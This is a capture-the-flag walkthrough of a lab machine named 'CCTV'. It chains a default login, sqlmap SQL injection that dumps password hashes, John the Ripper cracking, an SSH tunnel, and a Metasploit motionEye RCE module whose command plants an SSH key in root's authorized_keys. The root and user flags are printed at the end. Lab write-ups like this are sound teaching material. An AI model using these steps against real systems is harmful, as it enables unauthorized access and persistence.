# CCTV

We kick things off the way all good adventures begin: with an Nmap scan and a little optimism.

```shellscript
┌──(jagerr㉿kali)-[~]
└─$ nmap -sC -sV 10.129.7.112 -p- -T4
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-10 11:24 +0100
Warning: 10.129.7.112 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.129.7.112
Host is up (0.035s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 76:1d:73:98:fa:05:f7:0b:04:c2:3b:c4:7d:e6:db:4a (ECDSA)
|_  256 e3:9b:38:08:9a:d7:e9:d1:94:11:ff:50:80:bc:f2:59 (ED25519)
80/tcp    open     http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://cctv.htb/
|_http-server-header: Apache/2.4.58 (Ubuntu)
46956/tcp filtered unknown
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 802.49 seconds
```

While Nmap slowly chews through all 65,535 ports and makes us question our life choices, we quietly hope port 80 gives us something useful.Thankfully, it does:

<figure><img src="../.gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>

The website loads, and naturally the giant shiny **“**&#x53;taff Logi&#x6E;**”** button is begging to be clicked. So we click it, because ignoring a suspicious login portal on a target box would just be rude. That drops us onto a login page:

<figure><img src="../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

Now, as is tradition, I try `admin:admin` first.

<figure><img src="../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>

And somehow... it works. That immediately tells us two things: Somebody made some questionable decisions and that we should keep digging.

Once inside, I notice we’re dealing with ZoneMinder v1.37.63. A quick search turns up a public advisory and PoC: [https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3)&#x20;

Poking around the application also reveals a users tab**le**, which is always an encouraging sign when you’re trying to make bad things happen in a very controlled and educational way.

<figure><img src="../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

At this point, the goal is simple: confirm whether the target is vulnerable to SQL injection and, if so, see whether we can dump user data.

First, I let `sqlmap` do the detective work.

```shellscript
┌──(jagerr㉿kali)-[~]
└─$ sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie=ZMSESSID=blaajc4v10u839uc4im95kfc0u
...
[11:41:14] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[11:41:25] [INFO] GET parameter 'tid' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable                                                                   
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[11:41:41] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[11:41:41] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[11:41:42] [INFO] checking if the injection point on GET parameter 'tid' is a false positive
GET parameter 'tid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 276 HTTP(s) requests:
---
Parameter: tid (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: view=request&request=event&action=removetag&tid=1 AND (SELECT 6370 FROM (SELECT(SLEEP(5)))rXSE)
---
[11:42:06] [INFO] the back-end DBMS is MySQL
[11:42:06] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12
[11:42:06] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 67 times
[11:42:06] [INFO] fetched data logged to text files under '/home/jagerr/.local/share/sqlmap/output/cctv.htb'                                                                          

[*] ending @ 11:42:06 /2026-03-10/

```

Beautiful. `tid` is injectable, and the backend is **MySQL**. Time-based blind SQL injection isn’t exactly fast or glamorous, but it gets the job done.

Next, I ask `sqlmap` what database we’re currently sitting in:

```shellscript
┌──(jagerr㉿kali)-[~]
└─$ sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1&id=1" \
  --cookie="ZMSESSID=p68jg8441on1cgslho03neag46" \
  --technique=T \
  --dbms=mysql \ 
  --ignore-code=500 \
  -p tid \
  --current-db
...
[13:27:17] [INFO] confirming MySQL
[13:27:17] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[13:27:27] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 8.0.0
[13:27:27] [INFO] fetching current database
[13:27:27] [INFO] retrieved: zm
current database: 'zm'
[13:28:10] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 22 times
```

The current database is `zm`, which lines up perfectly with ZoneMinder. A quick check of the ZoneMinder [database docs](https://wiki.zoneminder.com/MySQL) confirms that a `Users` table should exist there. So naturally, we go after it.

```shellscript
┌──(jagerr㉿kali)-[~]
└─$ sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1&id=1" \
  --cookie="ZMSESSID=qjtdf4ud4gfg7g2dmjbg1148i0" \
  --dbms=mysql \
  --ignore-code=500 \
  -p tid \
  -D zm -T Users -C Username,Email,Password \
  --dump
...
[14:10:54] [INFO] retrieved: admin
Database: zm
Table: Users
[3 entries]
+------------+---------+--------------------------------------------------------------+
| Username   | Email   | Password                                                     |
+------------+---------+--------------------------------------------------------------+
| superadmin | <blank> | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm |
| mark       | <blank> | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
| admin      | <blank> | $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m |
+------------+---------+--------------------------------------------------------------+
```

And there we have it: three user hashes. Since **mark** looks like the most promising foothold, I take that hash and toss it to John.

```shellscript
┌──(jagerr㉿kali)-[~/Downloads]
└─$ cat more-hashes.txt                                     
mark:$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.

┌──(jagerr㉿kali)-[~]
└─$ john --wordlist=/usr/share/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt /home/jagerr/Downloads/more-hashes.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X2])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
opensesame       (mark)     
1g 0:00:00:29 DONE (2026-03-10 14:22) 0.03419g/s 154.3p/s 154.3c/s 154.3C/s united1..qweewq
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

John comes back with the goods: `mark:opensesame` That means it’s SSH time:

```shellscript
┌──(jagerr㉿kali)-[~/…/share/sqlmap/output/cctv.htb]
└─$ ssh mark@10.129.7.112  
The authenticity of host '10.129.7.112 (10.129.7.112)' can't be established.
ED25519 key fingerprint is: SHA256:KrrHjS+nu1wJEfv1/NxT1fI+ODJaSRdJtFg201G+tO0
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.7.112' (ED25519) to the list of known hosts.
mark@10.129.7.112's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue 10 Mar 13:23:51 UTC 2026

  System load:           0.08
  Usage of /:            75.0% of 8.70GB
  Memory usage:          29%
  Swap usage:            0%
  Processes:             260
  Users logged in:       0
  IPv4 address for eth0: 10.129.7.112
  IPv6 address for eth0: dead:beef::250:56ff:fe94:ef90


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

14 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
mark@cctv:~$ id
uid=1000(mark) gid=1000(mark) groups=1000(mark),24(cdrom),30(dip),46(plugdev)
mark@cctv:~$ 
```

We’re in as `mark`.

First order of business: check for easy privilege escalation with `sudo`.

```shellscript
mark@cctv:/home$ sudo -l
[sudo] password for mark: 
Sorry, user mark may not run sudo on cctv.
```

No freebies there.

So we start rummaging around the filesystem like digital raccoons and eventually stumble across something interesting in `/etc/motioneye/:`

```shellscript
mark@cctv:/tmp$ whereis motioneye
motioneye: /etc/motioneye
mark@cctv:/tmp$ cd /etc/motioneye/
mark@cctv:/etc/motioneye$ ls
camera-1.conf  motion.conf  motioneye.conf
```

Inside `motion.conf`, we find some very juicy commented credentials:

```shellscript
mark@cctv:/etc/motioneye$ cat motion.conf 
# @admin_username admin
# @normal_username user
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
# @lang en
# @enabled on
# @normal_password 


setup_mode off
webcontrol_port 7999
webcontrol_interface 1
webcontrol_localhost on
webcontrol_parms 2

camera camera-1.conf
```

That’s promising.

Then `motioneye.conf` tells us something even more useful:

```shellscript
mark@cctv:/etc/motioneye$ cat motioneye.conf 
# path to the configuration directory (must be writable by motionEye)
conf_path /etc/motioneye

# path to the directory where pid files go (must be writable by motionEye)
run_path /run/motioneye

# path to the directory where log files go (must be writable by motionEye)
log_path /var/log/motioneye

# default output path for media files (must be writable by motionEye)
media_path /var/lib/motioneye

# the log level (use quiet, error, warning, info or debug)
log_level info

# the IP address to listen on
# (0.0.0.0 for all interfaces, 127.0.0.1 for localhost)
listen 127.0.0.1

# the TCP port to listen on
port 8765

# path to the motion binary to use (automatically detected if commented)
#motion_binary /usr/bin/motion

# whether motion HTTP control interface listens on
# localhost or on all interfaces
motion_control_localhost true

# the TCP port that motion HTTP control interface listens on
motion_control_port 7999

# interval in seconds at which motionEye checks if motion is running
motion_check_interval 10

# whether to restart the motion daemon when an error occurs while communicating with it
motion_restart_on_errors false

# interval in seconds at which motionEye checks the SMB mounts
mount_check_interval 300

# interval in seconds at which the janitor is called
# to remove old pictures and movies
cleanup_interval 43200

# timeout in seconds to wait for response from a remote motionEye server
remote_request_timeout 10

# timeout in seconds to wait for mjpg data from the motion daemon
mjpg_client_timeout 10

# timeout in seconds after which an idle mjpg client is removed
# (set to 0 to disable)
mjpg_client_idle_timeout 10

# enable SMB shares (requires motionEye to run as root and cifs-utils installed)
smb_shares false

# the directory where the SMB mount points will be created
smb_mount_root /media

# path to the wpa_supplicant.conf file
# (enable this to configure wifi settings from the UI)
#wpa_supplicant_conf /etc/wpa_supplicant.conf

# path to the localtime file
# (enable this to configure the system time zone from the UI)
#local_time_file /etc/localtime

# enables shutdown and rebooting after changing system settings
# (such as wifi settings or time zone)
enable_reboot false

# timeout in seconds to use when talking to the SMTP server
smtp_timeout 60

# timeout in seconds to wait for media files list
list_media_timeout 120

# timeout in seconds to wait for media files list, when sending emails
list_media_timeout_email 10

# timeout in seconds to wait for media files list, when sending a telegram
list_media_timeout_telegram 10

# timeout in seconds to wait for zip file creation
zip_timeout 500

# timeout in seconds to wait for timelapse creation
timelapse_timeout 500

# enable adding and removing cameras from UI
add_remove_cameras true

# enables HTTP basic authentication scheme (in addition to, not instead of the signature mechanism)
http_basic_auth false

# overrides the hostname (useful if motionEye runs behind a reverse proxy)
#server_name motionEye
```

So MotionEye is only listening locally on port 8765. That means we can’t hit it directly from our machine, but SSH port forwarding solves that nicely.

```shellscript
┌──(jagerr㉿kali)-[~/Downloads]
└─$ ssh -L 8765:localhost:8765 mark@cctv.htb
mark@cctv.htb's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue 10 Mar 14:26:35 UTC 2026

  System load:           0.15
  Usage of /:            75.7% of 8.70GB
  Memory usage:          37%
  Swap usage:            0%
  Processes:             277
  Users logged in:       1
  IPv4 address for eth0: 10.129.7.112
  IPv6 address for eth0: dead:beef::250:56ff:fe94:ef90


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

14 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Tue Mar 10 14:01:14 2026 from 10.10.15.133
mark@cctv:~$ 
```

With the tunnel in place, we browse to `localhost:8765` and land on the MotionEye login page.

<figure><img src="../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>

Using the admin credential we found in the config (`admin:989c5a8ee87a0e9521ec81a79187d162109282f0`), we get in. Once inside, the sidebar reveals the versions: `motionEye 0.43.1b4` and `motion 4.7.1`

<figure><img src="../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>

Now that’s interesting, because a quick search turns up a Metasploit module for a known authenticated RCE against MotionEye:

```shellscript
┌──(jagerr㉿kali)-[~]
└─$ msfconsole -q
msf > search motioneye

Matching Modules
================

   #  Name                                                  Disclosure Date  Rank       Check  Description
   -  ----                                                  ---------------  ----       -----  -----------
   0  exploit/linux/http/motioneye_auth_rce_cve_2025_60787  2025-09-09       excellent  Yes    Remote Code Execution Vulnerability in MotionEye Frontend (CVE-2025-60787)
```

That’s exactly the kind of gift we like to unwrap.

I configure the module to target the local forwarded service and use a simple command payload to drop my SSH public key into `/root/.ssh/authorized_keys`.

```shellscript
msf > use 0
[*] No payload configured, defaulting to cmd/linux/http/x64/meterpreter/reverse_tcp
msf exploit(linux/http/motioneye_auth_rce_cve_2025_60787) > show options

Module options (exploit/linux/http/motioneye_auth_rce_cve_2025_60787):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The password used to authenticate to MotionEye
   Proxies                     no        A proxy chain of format type:host:port[,type:host:por
                                         t][...]. Supported proxies: sapni, socks4, http, sock
                                         s5, socks5h
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/d
                                         ocs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Path to MotionEye
   USERNAME   admin            yes       The username used to authenticate to MotionEye
   VHOST                       no        HTTP server virtual host


Payload options (cmd/linux/http/x64/meterpreter/reverse_tcp):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   FETCH_COMMAND   CURL             yes       Command to fetch payload (Accepted: CURL, FTP, T
                                              FTP, TNFTP, WGET)
   FETCH_DELETE    false            yes       Attempt to delete the binary after execution
   FETCH_FILELESS  none             yes       Attempt to run payload without touching disk by
                                              using anonymous handles, requires Linux ≥3.17 (f
                                              or Python variant also Python ≥3.8, tested shell
                                              s are sh, bash, zsh) (Accepted: none, python3.8+
                                              , shell-search, shell)
   FETCH_SRVHOST                    no        Local IP to use for serving payload
   FETCH_SRVPORT   8080             yes       Local port to use for serving payload
   FETCH_URIPATH                    no        Local URI to use for serving payload
   LHOST           192.168.64.3     yes       The listen address (an interface may be specifie
                                              d)
   LPORT           4444             yes       The listen port


   When FETCH_COMMAND is one of CURL,GET,WGET:

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   FETCH_PIPE  false            yes       Host both the binary payload and the command so it c
                                          an be piped directly to the shell.


   When FETCH_FILELESS is none:

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   FETCH_FILENAME      PLILlONrIcHm     no        Name to use on remote system when storing pa
                                                  yload; cannot contain spaces or slashes
   FETCH_WRITABLE_DIR  ./               yes       Remote writable dir to store payload; cannot
                                                   contain spaces


Exploit target:

   Id  Name
   --  ----
   0   Unix Command



View the full module info with the info, or info -d command.

msf exploit(linux/http/motioneye_auth_rce_cve_2025_60787) > set PASSWORD 989c5a8ee87a0e9521ec81a79187d162109282f0
PASSWORD => 989c5a8ee87a0e9521ec81a79187d162109282f0
msf exploit(linux/http/motioneye_auth_rce_cve_2025_60787) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf exploit(linux/http/motioneye_auth_rce_cve_2025_60787) > set RPORT 8765
RPORT => 8765
msf exploit(linux/http/motioneye_auth_rce_cve_2025_60787) > set LHOST 127.0.0.1
LHOST => 127.0.0.1
msf exploit(linux/http/motioneye_auth_rce_cve_2025_60787) > set LPORT 4444
LPORT => 4444
msf exploit(linux/http/motioneye_auth_rce_cve_2025_60787) > set payload cmd/unix/generic
payload => cmd/unix/generic
msf exploit(linux/http/motioneye_auth_rce_cve_2025_60787) > set CMD mkdir -p /root/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2062R8bf400emPiDTbci8OHsra9qvi3IQzY9iacGzXLTawX5td3lyERzYWhPTJnygxaCx4sUSJD8eZuz/McyS6Y6E9M5PcrmHDMciftT/ht3SFJvP/MlFnqOf8ccU8o68kSkY+uP4F4+P1xbVZJvQ00HHkIETuzG8w253sGxtOv3hiWwFTKE/ZHSHxHdnrJqWfq/uijGMj+SbsydeSjgE4EbaucmKizDUM00Ia6ybe7tKVCIbRfe2pHF+W9Ffo3cJGZ2tcK2YgTCGMOZLVm3rlWNFfIuqFRu4V5Gw5tGk/FmCAOWOCuOws9sr8lqYpprfyIjD9uUKOURBGEXhIx6YnKC/CSMml+LvsR7ifDfVNFXBWAtnApgsf1fNZkeV3mEH2zbWfQYt6IHXnYJz0vMVdNCQC4/oHXx4VXHwdyDuhjMK3XqNTefqIj14TGcYxp5mVzo1PR2azbY2fP1BRqLGVS4/fiBE2/s8q4uEmmouA/ffZK/Xnb4nwa4RLCabgS8= jagerr@kali' >> /root/.ssh/authorized_keys
CMD => mkdir -p /root/.ssh && echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2062R8bf400emPiDTbci8OHsra9qvi3IQzY9iacGzXLTawX5td3lyERzYWhPTJnygxaCx4sUSJD8eZuz/McyS6Y6E9M5PcrmHDMciftT/ht3SFJvP/MlFnqOf8ccU8o68kSkY+uP4F4+P1xbVZJvQ00HHkIETuzG8w253sGxtOv3hiWwFTKE/ZHSHxHdnrJqWfq/uijGMj+SbsydeSjgE4EbaucmKizDUM00Ia6ybe7tKVCIbRfe2pHF+W9Ffo3cJGZ2tcK2YgTCGMOZLVm3rlWNFfIuqFRu4V5Gw5tGk/FmCAOWOCuOws9sr8lqYpprfyIjD9uUKOURBGEXhIx6YnKC/CSMml+LvsR7ifDfVNFXBWAtnApgsf1fNZkeV3mEH2zbWfQYt6IHXnYJz0vMVdNCQC4/oHXx4VXHwdyDuhjMK3XqNTefqIj14TGcYxp5mVzo1PR2azbY2fP1BRqLGVS4/fiBE2/s8q4uEmmouA/ffZK/Xnb4nwa4RLCabgS8= jagerr@kali >> /root/.ssh/authorized_keys
msf exploit(linux/http/motioneye_auth_rce_cve_2025_60787) > run
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Detected version 0.43.1b4, which is vulnerable
[*] Adding malicious camera...
[+] Camera successfully added
[*] Setting up exploit...
[+] Exploit setup complete
[*] Triggering exploit...
[+] Exploit triggered, waiting for session...
[*] Removing camera
[+] Camera removed successfully
[*] Exploit completed, but no session was created.
```

Metasploit says no session was created, but in this case that’s actually fine. We didn’t need a Meterpreter shell — we just needed our key written to root’s `authorized_keys`.

So the moment of truth:

```shellscript
┌──(jagerr㉿kali)-[~/.ssh]
└─$ ssh root@10.129.7.112
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue 10 Mar 14:53:22 UTC 2026

  System load:           0.0
  Usage of /:            75.9% of 8.70GB
  Memory usage:          38%
  Swap usage:            0%
  Processes:             289
  Users logged in:       1
  IPv4 address for eth0: 10.129.7.112
  IPv6 address for eth0: dead:beef::250:56ff:fe94:ef90


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

14 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

root@cctv:~# id
uid=0(root) gid=0(root) groups=0(root)
```

And just like that, we’re root.

From there, grabbing the flags is just cleanup:

```shellscript
root@cctv:~# cat root.txt 
9343e21945b0bdc2be6fbf8f79bb5b1d
root@cctv:~# cat /home/sa_mark/user.txt 
7377e238d3eba37fe879bc64028e02a5
```

> **Root flag:** 9343e21945b0bdc2be6fbf8f79bb5b1d
>
> **User flag:** 7377e238d3eba37fe879bc64028e02a5
